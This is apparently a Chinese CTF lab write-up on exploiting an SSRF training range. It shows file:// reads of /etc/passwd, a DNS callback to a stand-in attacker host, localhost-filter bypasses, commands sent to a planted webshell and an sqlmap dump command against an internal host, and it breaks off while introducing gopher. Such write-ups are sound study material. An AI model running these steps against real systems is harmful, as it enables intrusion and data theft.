# SSRF-vlus-main   WP(内网redis)

### 一，配置环境

从GitHub中下载靶场到kali,配置打开。

![image-20251223211102744](C:\Users\赵念\AppData\Roaming\Typora\typora-user-images\image-20251223211102744.png)



### 二，测试是否存在SSRF漏洞

打开`index.php` 网站之后：

![image-20251224163735192](C:\Users\赵念\AppData\Roaming\Typora\typora-user-images\image-20251224163735192.png)

是一个站点快照的网站，有URL的输入框。

那么我们就怀疑SSRF漏洞：

**确认：**后端有没有替你发送请求。

> #### 测试SSRF漏洞的方式：
>
> ##### 方法一：
>
> 访问一个能感知到的外部地址：
>
> 例如：
>
> - 你自己的服务器
> - `http://example.com`
> - `http://httpbin.org/get`
>
> 观察：
>
> - 页面是否发生变化
> - 是否加载了远端内容
> - 是否又请求时间延迟
>
> ##### 方法二：
>
> 本地回环地址：
>
> ```
> http://127.0.0.1
> http://localhost
> ```
>
> 观察：
>
> - 返回是否为当前站点页面
> - 或内部管理页面
> - 或和外网完全不同的响应
>
> ##### 方法三：
>
> 协议测试
>
> ```
> file:///etc/hosts
> ```
>
> 结果判断：
>
> - 成功读取——高危漏洞
>
> ##### 方法四：
>
> 回连测试（无回显场景）
>
> DNS外带：
>
> ```
> http://youradmin.attacker.com
> ```
>
> 观察：
>
> - DNS解析记录
> - Web访问日志
>
> ##### 方法五：
>
> 端口差异
>
> ```
> http://127.0.0.1:80
> http://127.0.0.1:22
> ```
>
> 观察：
>
> - 加载慢
> - 空白
> - 报错不同
>
> 响应差异=后端真的在连
>
> ##### 方法六：
>
> 过滤绕过测试（被拦截的时候）
>
> 常见绕过：
>
> - 127.1
> - 2130706433
> - 0x7f000001
> - http://localhost@evil.com
> - IPv6:[::1]

##### 测试 `http://127.0.0.1:8080`

![image-20251225000542987](C:\Users\赵念\AppData\Roaming\Typora\typora-user-images\image-20251225000542987.png)

##### 测试 `http://www.baidu.com`

![image-20251225000653579](C:\Users\赵念\AppData\Roaming\Typora\typora-user-images\image-20251225000653579.png)

这两个URL查询都有回显，所以确定，存在SSRF漏洞，可以查询一些有用的东西了



### 三，确认漏洞存在，进入查询信息阶段

#### 协议测试：

> 在SSRF中，协议决定上限：
>
> - 只支持 `http/https` ——中危到高危
> - 支持`file://` ——高危（信息泄露）
> - 支持 `gopher://` ——极高危(可能RCE)
>
> ##### file协议：
>
> 本地文件读取能力。

##### 尝试用file协议读取文件：

> ##### 第一优先级：（环境与权限判断）
>
> `/etc/passwd`
>
> 目的：
>
> - 确认是否能读取系统级文件
> - 判断运行用户
>
> 观察：
>
> - 有没有`root`
> - 有没有Web用户
> - 应用用户叫什么
>
> `/proc/self/cmdline`
>
> `proc/self/environ`
>
> ##### 第二优先级：（网络与内网结构）
>
> `/etc/hosts`
>
> 用于：
>
> - 判断是否有硬编码内网服务名
>
> `/proc/net/route`
>
> **目的：**
>
> - 查看默认网关
> - 判断是否在 Docker / K8s



通过查询`file:///etc/passwd`:

```
root:x:0:0:root:/root:/usr/bin/zsh
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
dhcpcd:x:100:65534:DHCP Client Daemon:/usr/lib/dhcpcd:/bin/false
systemd-timesync:x:991:991:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:990:990:System Message Bus:/nonexistent:/usr/sbin/nologin
tss:x:101:104:TPM software stack:/var/lib/tpm:/bin/false
strongswan:x:102:65534::/var/lib/strongswan:/usr/sbin/nologin
tcpdump:x:103:105::/nonexistent:/usr/sbin/nologin
sshd:x:989:65534:sshd user:/run/sshd:/usr/sbin/nologin
_rpc:x:104:65534::/run/rpcbind:/usr/sbin/nologin
dnsmasq:x:999:65534:dnsmasq:/var/lib/misc:/usr/sbin/nologin
avahi:x:105:108:Avahi mDNS daemon:/run/avahi-daemon:/usr/sbin/nologin
nm-openvpn:x:106:109:NetworkManager OpenVPN:/var/lib/openvpn/chroot:/usr/sbin/nologin
speech-dispatcher:x:107:29:Speech Dispatcher:/run/speech-dispatcher:/bin/false
usbmux:x:108:46:usbmux daemon:/var/lib/usbmux:/usr/sbin/nologin
nm-openconnect:x:109:110:NetworkManager OpenConnect plugin:/var/lib/NetworkManager:/usr/sbin/nologin
pulse:x:110:111:PulseAudio daemon:/run/pulse:/usr/sbin/nologin
pipewire:x:988:988:system user for pipewire:/nonexistent:/usr/sbin/nologin
lightdm:x:111:113:Light Display Manager:/var/lib/lightdm:/bin/false
statd:x:112:65534::/var/lib/nfs:/usr/sbin/nologin
saned:x:113:114::/var/lib/saned:/usr/sbin/nologin
polkitd:x:987:987:User for polkitd:/:/usr/sbin/nologin
rtkit:x:114:115:RealtimeKit:/proc:/usr/sbin/nologin
colord:x:115:116:colord colour management daemon:/var/lib/colord:/usr/sbin/nologin
mysql:x:116:118:MariaDB Server:/nonexistent:/bin/false
stunnel4:x:986:986:stunnel service system account:/var/run/stunnel4:/usr/sbin/nologin
geoclue:x:117:119::/var/lib/geoclue:/usr/sbin/nologin
Debian-snmp:x:118:120::/var/lib/snmp:/bin/false
sslh:x:119:121::/nonexistent:/usr/sbin/nologin
cups-pk-helper:x:120:124:user for cups-pk-helper service:/nonexistent:/usr/sbin/nologin
redsocks:x:121:125::/var/run/redsocks:/usr/sbin/nologin
_gophish:x:122:127::/var/lib/gophish:/usr/sbin/nologin
iodine:x:123:65534::/run/iodine:/usr/sbin/nologin
miredo:x:124:65534::/var/run/miredo:/usr/sbin/nologin
redis:x:125:128::/var/lib/redis:/usr/sbin/nologin
postgres:x:126:129:PostgreSQL administrator:/var/lib/postgresql:/bin/bash
mosquitto:x:127:130::/var/lib/mosquitto:/usr/sbin/nologin
inetsim:x:128:131::/var/lib/inetsim:/usr/sbin/nologin
_gvm:x:129:133::/var/lib/openvas:/usr/sbin/nologin
kali:x:1000:1000::/home/kali:/usr/bin/zsh
```

再尝试查询 `file:///etc/hosts`

查看内网，





### 22目录：

先扫描url,看到三个文件，所以去查看：



![image-20251226172145190](C:\Users\赵念\AppData\Roaming\Typora\typora-user-images\image-20251226172145190.png)

flag一访问就可以出

`phpinfo.php` 是一个敏感文件，就是版本信息：

`shell.php` 是一个典型的一句话木马，可以通过这个来获得内部信息。

![image-20251226172400017](C:\Users\赵念\AppData\Roaming\Typora\typora-user-images\image-20251226172400017.png)

比如：

```
shell.php?cmd=id
```

![image-20251226172721735](C:\Users\赵念\AppData\Roaming\Typora\typora-user-images\image-20251226172721735.png)

就可以获得用户id信息



再查看这台机器的hosts文件：

```
shell.php?cmd=cat /etc/hosts
```

如果不给空白编码的话，会返回空白

所以给空格编码：

```
shell.php?cmd=cat%20/etc/hosts
```

就会返回hosts文件：

![image-20251226173801835](C:\Users\赵念\AppData\Roaming\Typora\typora-user-images\image-20251226173801835.png)

这里就可以结束了，目录22：

这一个目录的知识点就是：

- 一句话木马的应用
- 目录遍历
- 通过 SSRF / WebShell，成功执行“带参数的系统命令”，并理解 URL 编码 / 空格绕过在命令执行中的必要性。



### 23目录：

![image-20251226175550536](C:\Users\赵念\AppData\Roaming\Typora\typora-user-images\image-20251226175550536.png)

```
sqlmap -u "http://10.68.1.51/" --data "url="  --prefix "172.172.0.59?username=admin'" --dbms mysql -p url --tech E -v 3 --level 3 --tamper space2comment   -D "user" --dump

```





### 24目录：（命令执行）

> 

这种场景和之前的攻击场景稍微不太一样，之前的代码注入和 SQL 注入都是直接通过 GET 方式来传递参数进行攻击的，但是这个命令执行的场景是通过 POST 方式触发的，我们无法使用使用 SSRF 漏洞通过 HTTP 协议来传递 POST 数据，这种情况下一般就得利用 gopher 协议来发起对内网应用的 POST 请求了，gopher 的基本请求格式如下：

